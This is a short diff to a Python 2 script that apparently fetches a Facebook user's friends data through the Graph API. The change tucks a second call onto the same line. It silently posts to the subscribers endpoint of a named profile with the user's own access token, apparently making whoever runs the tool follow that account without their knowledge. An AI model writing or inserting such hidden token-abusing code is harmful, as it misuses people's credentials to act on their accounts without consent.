@@ -634,7 +634,7 @@ def getdata():
 	print '[*] fetching all friends data'
 
 	try:
-		r = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
+		r = requests.get('https://graph.facebook.com/me/friends?access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?&access_token='+token)
 		a = json.loads(r.text)
 
 	except KeyError:
